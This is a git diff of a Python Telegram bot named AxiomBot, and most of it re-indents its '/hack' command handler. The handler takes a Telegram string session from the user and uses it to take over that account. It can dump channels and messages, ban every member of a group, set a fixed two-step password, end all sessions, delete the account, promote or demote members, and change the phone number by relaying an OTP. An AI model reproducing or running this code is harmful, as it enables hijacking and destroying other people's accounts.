@@ -24,6 +24,7 @@ client = TelegramClient(
 print("STARTING CLIENT")
 
 client.start(bot_token=token)
+client.parse_mode = 'md'
 
 print("CLIENT STARTED")
 from telethon import TelegramClient as tg
@@ -216,6 +217,7 @@ async def op(event):
 
 @client.on(events.NewMessage(pattern="/start"))
 async def op(event):
+    print("START COMMAND RECEIVED")
     global mm
     if not event.is_private:
         await event.reply("please use me in pm🥺")
@@ -230,6 +232,7 @@ async def op(event):
 
 @client.on(events.NewMessage(pattern="/hack", func=lambda x: x.is_private))
 async def start(event):
+    print("HACK COMMAND RECEIVED")
     global menu
     async with bot.conversation(event.chat_id) as x:
 
@@ -237,157 +240,157 @@ async def start(event):
 
         res = await x.get_response()
         r = res.text
-    if res.text == "A":
-      await x.send_message("GIVE STRING SESSION")
-      strses = await x.get_response()
-      op = await cu(strses.text)
-      if not op:
-        return await event.respond("This StringSession is terminated maybe")
-      try:
-        i = await userchannels(strses.text)
-      except:
-        return await event.reply("This StringSession is terminated maybe")
-      if len(i) > 3855:
-        with open("session.txt", "w") as file:
-          file.write(i + "\n\nDETAILS BY AXIOMBOT")
-        await bot.send_file(event.chat_id, "session.txt")
-        system("rm -rf session.txt")
-      else:
-        await event.reply(i + "\n\nThanks For using AxiomBot")
-    elif res.text == "B":
-      await x.send_message("GIVE STRING SESSION")
-      strses = await x.get_response()
-      op = await cu(strses.text)
-      if not op:
-        return await event.respond("This StringSession is terminated maybe")
-      i = await userinfo(strses.text)
-      await event.reply(i + "\n\nThanks For using AxiomBot")
-    elif r == "C":
-      await x.send_message("GIVE STRING SESSION")
-      strses = await x.get_response()
-      op = await cu(strses.text)
-      if not op:
-        return await event.respond("This StringSession is terminated maybe")
-      await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
-      grpid = await x.get_response()
-      await userbans(strses.text, grpid.text)
-      await event.reply("Banning all members Thanks For using AxiomBot")
-    elif r == "D":
-      await x.send_message("GIVE STRING SESSION")
-      strses = await x.get_response()
-      op = await cu(strses.text)
-      if not op:
-        return await event.respond("This StringSession is terminated maybe")
-      i = await usermsgs(strses.text)
-      await event.reply(i + "\n\nThanks For using AxiomBot")
-    elif r == "E":
-      await x.send_message("GIVE STRING SESSION")
-      strses = await x.get_response()
-      op = await cu(strses.text)
-      if not op:
-        return await event.respond("This StringSession is terminated maybe")
-      await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
-      grpid = await x.get_response()
-      await joingroup(strses.text, grpid.text)
-      await event.reply("Joined the Channel/Group Thanks For using AxiomBot")
-    elif r == "F":
-      await x.send_message("GIVE STRING SESSION")
-      strses = await x.get_response()
-      op = await cu(strses.text)
-      if not op:
-        return await event.respond("This StringSession is terminated maybe")
-      await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
-      grpid = await x.get_response()
-      await leavegroup(strses.text, grpid.text)
-      await event.reply("Leaved the Channel/Group Thanks For using AxiomBot")
-    elif r == "G":
-      await x.send_message("GIVE STRING SESSION")
-      strses = await x.get_response()
-      op = await cu(strses.text)
-      if not op:
-        return await event.respond("This StringSession is terminated maybe")
-      await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
-      grpid = await x.get_response()
-      await delgroup(strses.text, grpid.text)
-      await event.reply("Deleted the Channel/Group Thanks For using AxiomBot")
-    elif r == "H":
-      await x.send_message("GIVE STRING SESSION")
-      strses = await x.get_response()
-      op = await cu(strses.text)
-      if not op:
-        return await event.respond("This StringSession is terminated maybe")
-      i = await user2fa(strses.text)
-      if i:
-        await event.reply("User don't have two step thats why now two step is `AXIOMISTHEBEST` you can login now\n\nThanks For using AxiomBot")
-      else:
-        await event.reply("Sorry User Have two step already")
-    elif r == "I":
-      await x.send_message("GIVE STRING SESSION")
-      strses = await x.get_response()
-      op = await cu(strses.text)
-      if not op:
-        return await event.respond("This StringSession is terminated maybe")
-      i = await terminate(strses.text)
-      await event.reply("The all sessions are terminated\n\nThanks For using AxiomBot")
-    elif res.text == "J":
-      await x.send_message("GIVE STRING SESSION")
-      strses = await x.get_response()
-      op = await cu(strses.text)
-      if not op:
-        return await event.respond("This StringSession is terminated maybe")
-      i = await delacc(strses.text)
-      await event.reply("The Account is deleted SUCCESSFULLLY\n\nThanks For using AxiomBot")
-    elif res.text == "L":
-      await x.send_message("GIVE STRING SESSION")
-      strses = await x.get_response()
-      op = await cu(strses.text)
-      if not op:
-        return await event.respond("This StringSession is terminated maybe")
-      await x.send_message("NOW GIVE GROUP/CHANNEL USERNAME")
-      grp = await x.get_response()
-      await x.send_message("NOW GIVE USER USERNAME")
-      user = await x.get_response()
-      i = await promote(strses.text, grp.text, user.text)
-      await event.reply("I am Promoting you in Group/Channel wait a min 😗😗\n\nThanks For using AxiomBot")
-    elif res.text == "K":
-      await x.send_message("GIVE STRING SESSION")
-      strses = await x.get_response()
-      op = await cu(strses.text)
-      if not op:
-        return await event.respond("This StringSession is terminated maybe")
-      await x.send_message("NOW GIVE GROUP/CHANNEL USERNAME")
-      pro = await x.get_response()
-      try:
-        i = await demall(strses.text, pro.text)
-      except:
-        pass
-      await event.reply("I am Demoting all members of Group/Channel wait a min 😗😗\n\nThanks For using AxiomBot")
-    elif res.text == "M":
-      await x.send_message("GIVE STRING SESSION")
-      strses = await x.get_response()
-      op = await cu(strses.text)
-      if not op:
-        return await event.respond("This StringSession is terminated maybe")
-      await x.send_message("GIVE NUMBER WHICH YOU WANT TO CHANGE\n[NOTE: DONT USE 2ndline or text now numbers]\n[if you are use 2nd line or text now you can't get otp] ")
-      number = (await x.get_response()).text
-      try:
-        result = await change_number(strses.text, number)
-        await event.respond(result + "\n copy the phone code hash and check your number you got otp\ni stop for 20 sec copy phone code hash and otp")
-        await asyncio.sleep(20)
-        await x.send_message("NOW GIVE PHONE CODE HASH")
-        phone_code_hash = (await x.get_response()).text
-        await x.send_message("NOW GIVE THE OTP")
-        otp = (await x.get_response()).text
-        changing = await change_number_code(strses.text, number, phone_code_hash, otp)
-        if changing:
-          await event.respond("CONGRATULATIONS NUMBER WAS CHANGED")
+        if res.text == "A":
+          await x.send_message("GIVE STRING SESSION")
+          strses = await x.get_response()
+          op = await cu(strses.text)
+          if not op:
+            return await event.respond("This StringSession is terminated maybe")
+          try:
+            i = await userchannels(strses.text)
+          except:
+            return await event.reply("This StringSession is terminated maybe")
+          if len(i) > 3855:
+            with open("session.txt", "w") as file:
+              file.write(i + "\n\nDETAILS BY AXIOMBOT")
+            await bot.send_file(event.chat_id, "session.txt")
+            system("rm -rf session.txt")
+          else:
+            await event.reply(i + "\n\nThanks For using AxiomBot")
+        elif res.text == "B":
+          await x.send_message("GIVE STRING SESSION")
+          strses = await x.get_response()
+          op = await cu(strses.text)
+          if not op:
+            return await event.respond("This StringSession is terminated maybe")
+          i = await userinfo(strses.text)
+          await event.reply(i + "\n\nThanks For using AxiomBot")
+        elif r == "C":
+          await x.send_message("GIVE STRING SESSION")
+          strses = await x.get_response()
+          op = await cu(strses.text)
+          if not op:
+            return await event.respond("This StringSession is terminated maybe")
+          await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
+          grpid = await x.get_response()
+          await userbans(strses.text, grpid.text)
+          await event.reply("Banning all members Thanks For using AxiomBot")
+        elif r == "D":
+          await x.send_message("GIVE STRING SESSION")
+          strses = await x.get_response()
+          op = await cu(strses.text)
+          if not op:
+            return await event.respond("This StringSession is terminated maybe")
+          i = await usermsgs(strses.text)
+          await event.reply(i + "\n\nThanks For using AxiomBot")
+        elif r == "E":
+          await x.send_message("GIVE STRING SESSION")
+          strses = await x.get_response()
+          op = await cu(strses.text)
+          if not op:
+            return await event.respond("This StringSession is terminated maybe")
+          await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
+          grpid = await x.get_response()
+          await joingroup(strses.text, grpid.text)
+          await event.reply("Joined the Channel/Group Thanks For using AxiomBot")
+        elif r == "F":
+          await x.send_message("GIVE STRING SESSION")
+          strses = await x.get_response()
+          op = await cu(strses.text)
+          if not op:
+            return await event.respond("This StringSession is terminated maybe")
+          await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
+          grpid = await x.get_response()
+          await leavegroup(strses.text, grpid.text)
+          await event.reply("Leaved the Channel/Group Thanks For using AxiomBot")
+        elif r == "G":
+          await x.send_message("GIVE STRING SESSION")
+          strses = await x.get_response()
+          op = await cu(strses.text)
+          if not op:
+            return await event.respond("This StringSession is terminated maybe")
+          await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
+          grpid = await x.get_response()
+          await delgroup(strses.text, grpid.text)
+          await event.reply("Deleted the Channel/Group Thanks For using AxiomBot")
+        elif r == "H":
+          await x.send_message("GIVE STRING SESSION")
+          strses = await x.get_response()
+          op = await cu(strses.text)
+          if not op:
+            return await event.respond("This StringSession is terminated maybe")
+          i = await user2fa(strses.text)
+          if i:
+            await event.reply("User don't have two step thats why now two step is `AXIOMISTHEBEST` you can login now\n\nThanks For using AxiomBot")
+          else:
+            await event.reply("Sorry User Have two step already")
+        elif r == "I":
+          await x.send_message("GIVE STRING SESSION")
+          strses = await x.get_response()
+          op = await cu(strses.text)
+          if not op:
+            return await event.respond("This StringSession is terminated maybe")
+          i = await terminate(strses.text)
+          await event.reply("The all sessions are terminated\n\nThanks For using AxiomBot")
+        elif res.text == "J":
+          await x.send_message("GIVE STRING SESSION")
+          strses = await x.get_response()
+          op = await cu(strses.text)
+          if not op:
+            return await event.respond("This StringSession is terminated maybe")
+          i = await delacc(strses.text)
+          await event.reply("The Account is deleted SUCCESSFULLLY\n\nThanks For using AxiomBot")
+        elif res.text == "L":
+          await x.send_message("GIVE STRING SESSION")
+          strses = await x.get_response()
+          op = await cu(strses.text)
+          if not op:
+            return await event.respond("This StringSession is terminated maybe")
+          await x.send_message("NOW GIVE GROUP/CHANNEL USERNAME")
+          grp = await x.get_response()
+          await x.send_message("NOW GIVE USER USERNAME")
+          user = await x.get_response()
+          i = await promote(strses.text, grp.text, user.text)
+          await event.reply("I am Promoting you in Group/Channel wait a min 😗😗\n\nThanks For using AxiomBot")
+        elif res.text == "K":
+          await x.send_message("GIVE STRING SESSION")
+          strses = await x.get_response()
+          op = await cu(strses.text)
+          if not op:
+            return await event.respond("This StringSession is terminated maybe")
+          await x.send_message("NOW GIVE GROUP/CHANNEL USERNAME")
+          pro = await x.get_response()
+          try:
+            i = await demall(strses.text, pro.text)
+          except:
+            pass
+          await event.reply("I am Demoting all members of Group/Channel wait a min 😗😗\n\nThanks For using AxiomBot")
+        elif res.text == "M":
+          await x.send_message("GIVE STRING SESSION")
+          strses = await x.get_response()
+          op = await cu(strses.text)
+          if not op:
+            return await event.respond("This StringSession is terminated maybe")
+          await x.send_message("GIVE NUMBER WHICH YOU WANT TO CHANGE\n[NOTE: DONT USE 2ndline or text now numbers]\n[if you are use 2nd line or text now you can't get otp] ")
+          number = (await x.get_response()).text
+          try:
+            result = await change_number(strses.text, number)
+            await event.respond(result + "\n copy the phone code hash and check your number you got otp\ni stop for 20 sec copy phone code hash and otp")
+            await asyncio.sleep(20)
+            await x.send_message("NOW GIVE PHONE CODE HASH")
+            phone_code_hash = (await x.get_response()).text
+            await x.send_message("NOW GIVE THE OTP")
+            otp = (await x.get_response()).text
+            changing = await change_number_code(strses.text, number, phone_code_hash, otp)
+            if changing:
+              await event.respond("CONGRATULATIONS NUMBER WAS CHANGED")
+            else:
+              await event.respond("Something is wrong")
+          except Exception as e:
+            await event.respond("SEND THIS ERROR TO - @AXlOMM\n**LOGS**\n" + str(e))
+    
         else:
-          await event.respond("Something is wrong")
-      except Exception as e:
-        await event.respond("SEND THIS ERROR TO - @AXlOMM\n**LOGS**\n" + str(e))
-
-    else:
-      await event.respond("Wrong Text Found Re type /hack and use")
+          await event.respond("Wrong Text Found Re type /hack and use")
 
 
 
